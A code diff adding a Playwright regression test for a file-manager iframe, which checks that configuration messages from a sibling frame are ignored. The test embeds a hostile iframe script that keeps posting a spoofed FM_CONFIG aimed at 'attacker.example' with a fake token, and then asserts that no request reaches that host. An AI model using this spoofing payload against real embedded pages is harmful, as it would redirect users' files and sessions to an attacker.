@@ -538,6 +538,74 @@ test('picker multiple: selecting several files emits an FM_SELECT array', async 
   expect(sel.map((s: any) => s.name).sort()).toEqual([a, b].sort());
 });
 
+test('postMessage from a non-parent window (e.g. a sibling iframe) is ignored: only the real parent can configure the iframe', async ({ page }) => {
+  const token = mintToken();
+
+  // Regression test for a spoofing bug: the message listener used to trust
+  // whichever origin sent the FIRST FM_CONFIG, with no check that the sender
+  // was actually window.parent. A sibling iframe living in the same host page
+  // (e.g. a third-party ad/widget script) can grab a reference to the fm
+  // iframe via window.top.frames[...] and race the real host to send a
+  // malicious FM_CONFIG pointing at an attacker endpoint/token. Same-origin
+  // here is enough to prove the point: e.source differs from window.parent
+  // for ANY sibling frame, cross-origin or not.
+  const host = `<!doctype html><html><body>
+    <iframe id="fm" name="fm" src="/public/index.html" style="width:900px;height:600px;border:0"></iframe>
+    <iframe id="attacker" name="attacker" srcdoc="${[
+      '<script>',
+      "  var evil = { source: 'fluxfiles', type: 'FM_CONFIG', v: 1, id: 'evil',",
+      "    payload: { token: 'attacker-token', disk: 'local', endpoint: 'https://attacker.example', path: '' } };",
+      "  function fire() { try { window.top.frames['fm'].postMessage(evil, '*'); } catch (e) {} }",
+      '  fire();', // as early as possible, before the real host even sees FM_READY
+      '  setInterval(fire, 25);', // keep racing throughout the test
+      '</script>',
+    ].join('&#10;')}"></iframe>
+    <script>
+      window.__realConfigSent = false;
+      window.addEventListener('message', function (e) {
+        var m = e.data; if (!m || m.source !== 'fluxfiles') return;
+        if (m.type === 'FM_READY') {
+          document.getElementById('fm').contentWindow.postMessage({
+            source: 'fluxfiles', type: 'FM_CONFIG', v: 1, id: 'host-real',
+            payload: { token: ${JSON.stringify(token)}, disk: 'local', endpoint: location.origin }
+          }, '*');
+          window.__realConfigSent = true;
+        }
+      });
+    </script>
+  </body></html>`;
+
+  await page.route('**/__hijack_host', (route) => route.fulfill({ contentType: 'text/html', body: host }));
+  // The attacker's endpoint is a different origin entirely; nothing should ever
+  // reach it if the spoofed FM_CONFIG was correctly rejected.
+  let attackerHit = false;
+  await page.route('https://attacker.example/**', (route) => {
+    attackerHit = true;
+    return route.abort();
+  });
+
+  await page.goto('/__hijack_host');
+  await expect.poll(() => page.evaluate(() => (window as any).__realConfigSent)).toBe(true);
+
+  // The legit host's FM_CONFIG must win: the real UI boots against OUR origin
+  // with the real token, despite the sibling frame spamming a spoofed config
+  // both before and after it.
+  const frame = page.frameLocator('#fm');
+  await expect(frame.locator('.ff-app')).toBeVisible({ timeout: 15_000 });
+
+  const folder = `pw-hijack-${Date.now()}`;
+  await createFolder(frame, page, folder);
+  await enterFolder(frame, folder);
+
+  const fname = `hijack-${Date.now()}.png`;
+  await uploadFile(frame, pngFile(fname));
+  await expect(cardByName(frame, fname)).toBeVisible({ timeout: 15_000 });
+
+  // Give the attacker's 25ms interval plenty of chances to have fired.
+  await page.waitForTimeout(500);
+  expect(attackerHit).toBe(false);
+});
+
 test('bulk delete: select multiple files and delete them all at once', async ({ page }) => {
   const token = mintToken();
   // multiple=1 enables multi-select; Ctrl/Cmd-click accumulates the selection.
